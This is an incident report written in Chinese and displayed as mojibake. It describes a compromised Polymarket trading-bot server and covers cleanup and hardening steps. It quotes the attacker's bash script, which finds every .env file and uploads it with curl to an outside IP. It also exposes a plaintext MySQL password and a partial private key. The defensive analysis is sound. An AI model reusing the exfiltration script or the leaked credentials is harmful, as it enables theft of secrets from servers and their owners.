# ðŸš¨ å®‰å…¨äº‹ä»¶æŠ¥å‘Š

## äº‹ä»¶æ¦‚è¿°

**å‘çŽ°æ—¶é—´**: 2025å¹´12æœˆ9æ—¥ 18:55:39  
**äº‹ä»¶ç±»åž‹**: è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE) + æ•æ„Ÿä¿¡æ¯çªƒå–  
**ä¸¥é‡ç¨‹åº¦**: ðŸ”´ ä¸¥é‡  
**çŠ¶æ€**: âš ï¸ å¾…å¤„ç†

---

## æ”»å‡»è¯¦æƒ…

### 1. æ¶æ„è„šæœ¬ä¸‹è½½è®°å½•

ä»Ž PM2 é”™è¯¯æ—¥å¿—ä¸­å‘çŽ°ï¼š

```
--2025-12-09 18:55:39--  http://154.94.239.69:7070/yjsc
Connecting to 154.94.239.69:7070... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2042 (2.0K) [text/plain]
Saving to: '/tmp/yjscss'
2025-12-09 18:55:39 (146 MB/s) - '/tmp/yjscss' saved [2042/2042]
```

### 2. æ¶æ„è„šæœ¬å†…å®¹

è„šæœ¬è¢«ä¿å­˜åˆ° `/tmp/yjscss`ï¼Œå†…å®¹å¦‚ä¸‹ï¼š

```bash
#!/bin/bash

# ä¸Šä¼ ç›®æ ‡åœ°å€ï¼ˆé»‘å®¢PHPæŽ¥æ”¶ç«¯ï¼‰
UPLOAD_URL="http://154.94.239.69:7070"

# æœç´¢æ ¹ç›®å½•
SEARCH_ROOT="/"

# éåŽ†æ‰€æœ‰ .env* æ–‡ä»¶å¹¶ä¸Šä¼ åˆ°é»‘å®¢æœåŠ¡å™¨
find "$SEARCH_ROOT" -type f -name ".env*" | while read -r filepath; do
    safe_name=$(echo "$relative_path" | sed 's/\//_/g')
    curl -s -F "file=@$filepath;filename=$safe_name" "$UPLOAD_URL"
done
```

**è„šæœ¬ç›®çš„**: æ‰«ææœåŠ¡å™¨ä¸Šæ‰€æœ‰ `.env` æ–‡ä»¶ï¼Œä¸Šä¼ åˆ°é»‘å®¢æŽ§åˆ¶çš„æœåŠ¡å™¨ `154.94.239.69:7070`

### 3. é»‘å®¢æœåŠ¡å™¨ä¿¡æ¯

| é¡¹ç›® | å€¼ |
|------|-----|
| **IP** | 154.94.239.69 |
| **ç«¯å£** | 7070 |
| **ç”¨é€”** | æŽ¥æ”¶çªƒå–çš„æ•æ„Ÿæ–‡ä»¶ |

---

## æ³„éœ²çš„æ•æ„Ÿä¿¡æ¯

### âš ï¸ å·²ç¡®è®¤æ³„éœ²

| ç±»åž‹ | æ–‡ä»¶ | å†…å®¹ |
|------|------|------|
| **Polymarket ç§é’¥** | `.env` | `PRIVATE_KEY=d28be247...` |
| **MySQL å¯†ç ** | `.env` | `DB_PASSWORD=NPc1ky0jhn98ZU5CA5tm` |
| **å…¶ä»– API å¯†é’¥** | å„ `.env` æ–‡ä»¶ | å¾…ç¡®è®¤ |

### å—å½±å“é’±åŒ…

- **åœ°å€**: `0x87455B7cD7dCf42A778762018bb6A8dB7391f2ae`
- **å½“å‰ä½™é¢**: ~0 USDC, ~0.00000002 MATIC
- **çŠ¶æ€**: âš ï¸ ç§é’¥å·²æ³„éœ²ï¼Œéœ€è¦å¼ƒç”¨

---

## æ”»å‡»å…¥å£åˆ†æž

### å¯èƒ½çš„æ”»å‡»å‘é‡

1. **Next.js SSR æ¼æ´ž**
   - æ—¥å¿—ä¸­å‡ºçŽ° `apibug_test_12345` æµ‹è¯•æŽ¢é’ˆ
   - å¯èƒ½å­˜åœ¨æœåŠ¡ç«¯æ¸²æŸ“æ³¨å…¥æ¼æ´ž

2. **API è·¯ç”±å‘½ä»¤æ³¨å…¥**
   - æŸä¸ª API ç«¯ç‚¹å¯èƒ½æŽ¥å—ç”¨æˆ·è¾“å…¥å¹¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤
   - éœ€è¦å®¡è®¡æ‰€æœ‰ `exec()`, `spawn()`, `system()` è°ƒç”¨

3. **ä¾èµ–åŒ…æ¼æ´ž**
   - é˜¿é‡Œäº‘æåˆ° CVE-2025-55182 (React) å’Œ CVE-2025-66478 (Next.js)
   - éœ€è¦éªŒè¯è¿™äº› CVE æ˜¯å¦çœŸå®žå­˜åœ¨

### éœ€è¦æ£€æŸ¥çš„ä»£ç ä½ç½®

```
src/app/api/        # æ‰€æœ‰ API è·¯ç”±
src/lib/            # åº“å‡½æ•°
server/             # åŽç«¯äº¤æ˜“é€»è¾‘
```

### æ£€æŸ¥å‘½ä»¤

```bash
# æœç´¢å¯èƒ½çš„å‘½ä»¤æ‰§è¡Œä»£ç 
grep -r "exec\|spawn\|system\|child_process" src/ server/ --include="*.ts" --include="*.tsx"

# æœç´¢å¯èƒ½çš„ eval è°ƒç”¨
grep -r "eval\|Function(" src/ server/ --include="*.ts" --include="*.tsx"

# æ£€æŸ¥ package.json ä¸­çš„è„šæœ¬
cat package.json | grep -A 20 '"scripts"'
```

---

## ç´§æ€¥å¤„ç†æ¸…å•

### âœ… å·²å®Œæˆ

- [x] åˆ é™¤æ¶æ„è„šæœ¬ `/tmp/yjscss`
- [x] è®°å½•æ”»å‡»è¯¦æƒ…

### â³ å¾…å¤„ç†

- [ ] **ç«‹å³**: è½¬ç§»é’±åŒ…å‰©ä½™èµ„é‡‘åˆ°æ–°åœ°å€
- [ ] **ç«‹å³**: ç”Ÿæˆæ–°çš„ Polymarket API å‡­è¯ (`npm run gen-creds`)
- [ ] **ç«‹å³**: æ›´æ”¹ MySQL root å¯†ç 
- [ ] **1å°æ—¶å†…**: å®¡è®¡æ‰€æœ‰ API è·¯ç”±ä»£ç 
- [ ] **1å°æ—¶å†…**: æ£€æŸ¥æ˜¯å¦æœ‰å…¶ä»–åŽé—¨
- [ ] **ä»Šæ—¥å†…**: å‡çº§ Next.js åˆ°æœ€æ–°ç‰ˆæœ¬
- [ ] **ä»Šæ—¥å†…**: å®‰è£… fail2ban é˜²æ­¢ SSH æš´åŠ›ç ´è§£
- [ ] **ä»Šæ—¥å†…**: é…ç½®é˜¿é‡Œäº‘å®‰å…¨ç»„é™åˆ¶å…¥ç«™æµé‡

---

## å®‰å…¨åŠ å›ºå»ºè®®

### 1. æ›´æ¢æ‰€æœ‰å¯†é’¥

```bash
# ç”Ÿæˆæ–°çš„ Polymarket å‡­è¯
cd /home/php/polymarket-trading-bot
npm run gen-creds

# æ›´æ”¹ MySQL å¯†ç 
mysql -u root -p
ALTER USER 'root'@'localhost' IDENTIFIED BY 'æ–°çš„å¼ºå¯†ç ';
FLUSH PRIVILEGES;
```

### 2. å®‰è£…å®‰å…¨å·¥å…·

```bash
# å®‰è£… fail2ban
apt install fail2ban -y
systemctl enable fail2ban
systemctl start fail2ban

# é…ç½® fail2ban ä¿æŠ¤ SSH
cat > /etc/fail2ban/jail.local << 'EOF'
[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 3600
EOF

systemctl restart fail2ban
```

### 3. é™åˆ¶ MySQL å¤–ç½‘è®¿é—®

ç¼–è¾‘ `/etc/mysql/mysql.conf.d/mysqld.cnf`:
```ini
bind-address = 127.0.0.1
```

### 4. ä»£ç å®¡è®¡è¦ç‚¹

```typescript
// å±é™©æ¨¡å¼ - éœ€è¦æ£€æŸ¥
import { exec } from 'child_process'
exec(userInput)  // âŒ å‘½ä»¤æ³¨å…¥

// å®‰å…¨æ¨¡å¼
import { execFile } from 'child_process'
execFile('ls', ['-la', sanitizedPath])  // âœ… å‚æ•°åŒ–æ‰§è¡Œ
```

---

## æ—¶é—´çº¿

| æ—¶é—´ | äº‹ä»¶ |
|------|------|
| 2025-12-09 18:55:39 | æ¶æ„è„šæœ¬è¢«ä¸‹è½½æ‰§è¡Œ |
| 2025-12-09 19:xx:xx | å‘çŽ° PM2 æ—¥å¿—å¼‚å¸¸ |
| 2025-12-09 19:xx:xx | ç¡®è®¤å…¥ä¾µï¼Œåˆ é™¤æ¶æ„æ–‡ä»¶ |
| å¾…å®š | å®Œæˆå®‰å…¨åŠ å›º |

---

## å‚è€ƒèµ„æ–™

- [é˜¿é‡Œäº‘å®‰å…¨å…¬å‘Š](https://help.aliyun.com/zh/security-center/)
- [Next.js å®‰å…¨æœ€ä½³å®žè·µ](https://nextjs.org/docs/app/building-your-application/deploying/production-checklist#security)
- [OWASP å‘½ä»¤æ³¨å…¥é˜²æŠ¤](https://owasp.org/www-community/attacks/Command_Injection)

---

**æœ€åŽæ›´æ–°**: 2025-12-09
